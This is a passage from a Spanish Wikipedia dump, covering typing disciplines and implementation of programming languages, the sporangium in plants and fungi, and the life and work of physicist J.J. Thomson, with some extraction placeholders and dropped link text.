Los lenguajes con tipos dinámicos determinan la validez de los tipos involucrados en las operaciones durante la ejecución del programa. En otras palabras, los tipos están asociados con "valores en ejecución" en lugar de "expresiones textuales". Como en el caso de lenguajes con tipos inferidos, los lenguajes con tipos dinámicos no requieren que el programador escriba los tipos de las expresiones. Entre otras cosas, esto permite que una misma variable se pueda asociar con valores de tipos distintos en diferentes momentos de la ejecución de un programa. Sin embargo, los errores de tipo no pueden ser detectados automáticamente hasta que se ejecuta el código, dificultando la depuración de los programas, no obstante, en lenguajes con tipos dinámicos se suele dejar de lado la depuración en favor de técnicas de desarrollo como por ejemplo BDD y TDD. Ruby, Lisp, JavaScript y Python son lenguajes con tipos dinámicos.

Los lenguajes "débilmente tipados" permiten que un valor de un tipo pueda ser tratado como de otro tipo, por ejemplo una cadena puede ser operada como un número. Esto puede ser útil a veces, pero también puede permitir ciertos tipos de fallas que no pueden ser detectadas durante la compilación o a veces ni siquiera durante la ejecución.

Los lenguajes "fuertemente tipados" evitan que pase lo anterior. Cualquier intento de llevar a cabo una operación sobre el tipo equivocado dispara un error. A los lenguajes con tipos fuertes se les suele llamar "de tipos seguros".

Lenguajes con tipos débiles como Perl y JavaScript permiten un gran número de conversiones de tipo implícitas. Por ejemplo en JavaScript la expresión codice_9 convierte implícitamente codice_10 a un número, y esta conversión es exitosa inclusive cuando codice_10 es codice_12, codice_13, un codice_14 o una cadena de letras. Estas conversiones implícitas son útiles con frecuencia, pero también pueden ocultar errores de programación.

Las características de "estáticos" y "fuertes" son ahora generalmente consideradas conceptos ortogonales, pero su trato en diferentes textos varia. Algunos utilizan el término "de tipos fuertes" para referirse a "tipos fuertemente estáticos" o, para aumentar la confusión, simplemente como equivalencia de "tipos estáticos". De tal manera que C ha sido llamado tanto lenguaje de tipos fuertes como lenguaje de tipos estáticos débiles.

La implementación de un lenguaje es la que provee una manera de que se ejecute un programa para una determinada combinación de software y hardware. Existen básicamente dos maneras de implementar un lenguaje: compilación e interpretación.


Se puede también utilizar una alternativa para traducir lenguajes de alto nivel. En lugar de traducir el programa fuente y grabar en forma permanente el código objeto que se produce durante la compilación para utilizarlo en una ejecución futura, el programador sólo carga el programa fuente en la computadora junto con los datos que se van a procesar. A continuación, un programa intérprete, almacenado en el sistema operativo del disco, o incluido de manera permanente dentro de la máquina, convierte cada proposición del programa fuente en lenguaje de máquina conforme vaya siendo necesario durante el procesamiento de los datos. El código objeto no se graba para utilizarlo posteriormente.

La siguiente vez que se utilice una instrucción, se la deberá interpretar otra vez y traducir a lenguaje máquina. Por ejemplo, durante el procesamiento repetitivo de los pasos de un ciclo o bucle, cada instrucción del bucle tendrá que volver a ser interpretada en cada ejecución repetida del ciclo, lo cual hace que el programa sea más lento en tiempo de ejecución (porque se va revisando el código en tiempo de ejecución) pero más rápido en tiempo de diseño (porque no se tiene que estar compilando a cada momento el código completo). El intérprete elimina la necesidad de realizar una compilación después de cada modificación del programa cuando se quiere agregar funciones o corregir errores; pero es obvio que un programa objeto compilado con antelación deberá ejecutarse con mucha mayor rapidez que uno que se debe interpretar a cada paso durante una ejecución del código.

La mayoría de lenguajes de alto nivel permiten la programación multipropósito, aunque muchos de ellos fueron diseñados para permitir programación dedicada, como lo fue el Pascal con las matemáticas en su comienzo. También se han implementado lenguajes educativos infantiles como Logo mediante una serie de simples instrucciones. En la actualidad son muy populares algunos lenguajes especialmente indicados para aplicaciones web, como Perl, PHP, Ruby, Python o JavaScript.

Para escribir programas que proporcionen los mejores resultados, cabe tener en cuenta una serie de detalles.





Los programas se pueden clasificar por el paradigma del lenguaje que se use para producirlos. Los principales paradigmas son: imperativos, declarativos y orientación a objetos.

Los programas que usan un lenguaje imperativo especifican un algoritmo, usan declaraciones, expresiones y sentencias. Una declaración asocia un nombre de variable con un tipo de dato, por ejemplo: codice_15. Una expresión contiene un valor, por ejemplo: codice_16 contiene el valor 4. Finalmente, una sentencia debe asignar una expresión a una variable o usar el valor de una variable para alterar el flujo de un programa, por ejemplo: codice_17. Una crítica común en los lenguajes imperativos es el efecto de las sentencias de asignación sobre una clase de variables llamadas "no locales".

Los programas que usan un lenguaje declarativo especifican las propiedades que la salida debe conocer y no especifican cualquier detalle de implementación. Dos amplias categorías de lenguajes declarativos son los lenguajes funcionales y los lenguajes lógicos. Los lenguajes funcionales no permiten asignaciones de variables no locales, así, se hacen más fácil, por ejemplo, programas como funciones matemáticas. El principio detrás de los lenguajes lógicos es definir el problema que se quiere resolver (el objetivo) y dejar los detalles de la solución al sistema. El objetivo es definido dando una lista de sub-objetivos. Cada sub-objetivo también se define dando una lista de sus sub-objetivos, etc. Si al tratar de buscar una solución, una ruta de sub-objetivos falla, entonces tal sub-objetivo se descarta y sistemáticamente se prueba otra ruta.

La forma en la cual se programa puede ser por medio de texto o de forma visual. En la programación visual los elementos son manipulados gráficamente en vez de especificarse por medio de texto.




</doc>
<doc id="6529" url="https://es.wikipedia.org/wiki?curid=6529" title="Esporangio">
Esporangio

El esporangio es la estructura de las plantas, hongos o algas que produce y contiene las esporas Se encuentran esporangios en las angiospermas, gimnospermas, helechos y sus parientes, en las briófitas, algas y hongos.

En relación al ciclo de vida de las plantas, en aquellas plantas cuya generación diplonte es multicelular (poseen "esporófito"), se llama esporangio a la estructura nacida en el esporófito que se especializa en llevar a cabo la meiosis que dará las esporas haploides (n).

Cuando alcanzan la madurez, los esporofitos producen esporangios en el tallo o más comúnmente en las hojas fértiles, que son los esporofilos. En ellos, los esporangios pueden situarse en la cara adaxial (haz), en el margen, o en la cara abaxial (envés). En los licófitos se forma un solo esporangio en cada esporofilo mientras que en los helechos se forman muchos, casi siempre reunidos en grupos definidos (soros). Las psilotópsida tienen los esporangios soldados en sinangios y las equisetópsida los presentan en la cara inferior de unos apéndices peltados, los esporangióforos, que se disponen formando estróbilos en el extremo de los tallos.

Atendiendo a su origen y modo de desarrollo se distinguen como dos tipos básicos de esporangios: los eusporangios, que en la madurez tienen una pared formada al menos por dos capas de células y contienen un número elevado de esporas (entre 500 y un millón), y los leptosporangios, que en la madurez tienen una pared con una sola capa de células y contienen generalmente 64 esporas.

Cuando los esporangios están maduros, lo más general es que se abran para dispersar las esporas gracias a la existencia de algún mecanismo de dehiscencia en la pared esporangial. En las isoetales y en los helechos acuáticos no existe ningún sistema de apertura, y las esporas se liberan cuando se descompone la pared de los esporangios. hongos con esporagios que tiene en consecuencia la madures.


</doc>
<doc id="6532" url="https://es.wikipedia.org/wiki?curid=6532" title="Joseph John Thomson">
Joseph John Thomson

Joseph John "J.J." Thomson, (Mánchester, Inglaterra, 18 de diciembre de 1856 - Cambridge, Inglaterra, 30 de agosto de 1940) fue un científico británico, descubridor del electrón, de los isótopos e inventor del espectrómetro de masa. En 1906 fue galardonado con el .

Thomson nació el 18 de diciembre de 1856 en Cheetham Hill, un distrito de Mánchester en Inglaterra, y tenía ascendencia escocesa. En 1870 estudió ingeniería en el Owens College, hoy parte de la Universidad de Mánchester, y se trasladó al Trinity College de Cambridge en 1876. En 1880, obtuvo su licenciatura en Matemáticas (Segunda Wrangler y segundo premio Smith) y MA (obteniendo el Premio Adams) en 1883. En 1884 se convirtió en profesor de Física en Cavendish. Uno de sus alumnos fue Ernest Rutherford, quien más tarde sería su sucesor en el puesto.

En 1890 se casó con Rose Elizabeth Paget, hija de "sir" Edward George Paget, médico, entonces Regius Profesor de Medicina (Regius Professor of Physic) en Cambridge. Con ella, fue padre de un hijo, George Paget Thomson, y una hija, Joan Paget Thomson. Su hijo se convirtió en un destacado físico, quien a su vez fue galardonado con el Premio Nobel de Física en 1937 por demostrar las propiedades de tipo ondulatorio de los electrones.

J.J. Thomson fue galardonado con el Premio Nobel de Física en 1906, «en reconocimiento de los grandes méritos de sus investigaciones teóricas y experimentales en la conducción de la electricidad generada por los gases». Fue nombrado caballero en 1908 y nombrado en la Orden del Mérito en 1912. En 1914 dio el Romanes Lecture en Oxford sobre la teoría atómica. En 1918 fue nombrado rector del Trinity College de Cambridge, donde conoció a Niels Bohr, donde permaneció hasta su muerte. Murió el 30 de agosto de 1940 y fue sepultado en la Abadía de Westminster, cerca de "sir" Isaac Newton.

Thomson fue elegido miembro de la Royal Society el 12 de junio de 1884, y posteriormente fue su presidente de 1915 a 1920.
En 1897 descubrió el electrón y propuso un modelo en el cual el átomo tenía carga positiva.

Thomson realizó una serie de experimentos en tubos de rayos catódicos, que le condujeron al descubrimiento de los electrones. Thomson utilizó el tubo de Crookes en tres experimentos diferentes.

En su tercer experimento (1897), Thomson determinó la relación entre la carga y la masa de los rayos catódicos, al medir cuánto se desvían por un campo magnético y la cantidad de energía que llevan. Encontró que la relación carga/masa era más de un millar de veces superior a la del ion Hidrógeno, lo que sugiere que las partículas son muy livianas o muy cargadas.

Las conclusiones de Thomson fueron audaces: los rayos catódicos estaban hechos de partículas que llamó "corpúsculos", y estos corpúsculos procedían de dentro de los átomos de los electrodos, lo que significa que los átomos son, de hecho, divisibles. Thomson imaginó que el átomo se compone de estos corpúsculos en un mar lleno de carga positiva; a este modelo del átomo, atribuido a Thomson, se le llamó el modelo de pudín de pasas.

En 1906 fue galardonado con el por su "trabajo sobre la conducción de la electricidad a través de los gases".

La imposibilidad de explicar que el átomo está formado por un núcleo compacto y una parte exterior denominada "corteza" implica que otros científicos como Ernest Rutherford o Niels Bohr continuasen con su investigación y establecieron otras teorías en las que los átomos tenían partes diferenciadas.

También Thomson invento los rayos positivos y, en 1911, descubrió la manera de utilizarlos para separar átomos de diferente masa. El objetivo se consiguió desviando los rayos positivos mediante campos eléctricos y magnéticos (espectrometría de masas). Así descubrió que el neón tiene dos isótopos (el neón-20 y el neón-22).

En la esquina inferior derecha de esta placa fotográfica hay marcas para los dos isótopos del neón, neón-20 y neón-22. En 1913, como parte de su exploración en la composición de los rayos canales, Thomson canalizó una corriente de neón ionizado mediante un campo magnético y un campo eléctrico y midió su desviación colocando una placa fotográfica en el camino del rayo. Thomson observó dos parches de luz sobre la placa fotográfica (ver imagen a la derecha), lo que supone dos parábolas de desviación. Thomson llegó a la conclusión de que el gas neón se compone de dos tipos de átomos de diferentes masas atómicas (neón-20 y neón-22).

Thomson en 1906 demostró que el hidrógeno tiene un único electrón. Permite confirmar o rechazar diversas teorías anteriores sobre número de los electrones, al igual que el carbono.

Thomson propuso el segundo modelo atómico (El primero fue propuesto por Dalton en 1794), que podía caracterizarse como una esfera de carga positiva en la cual se incrustan los electrones.

También analizó la propagación de ondas guiadas.

Aparte del Premio Nobel de Física (1906), le fueron concedidos los siguientes premios:

En 1991, el thomson (Th) fue propuesto por los químicos como unidad de medida masa-carga en espectroscopia de masas. Esta unidad se define como:
Sin embargo, ha pasado a ser una unidad obsoleta, y no se ha incorporado al Sistema Internacional.





</doc>
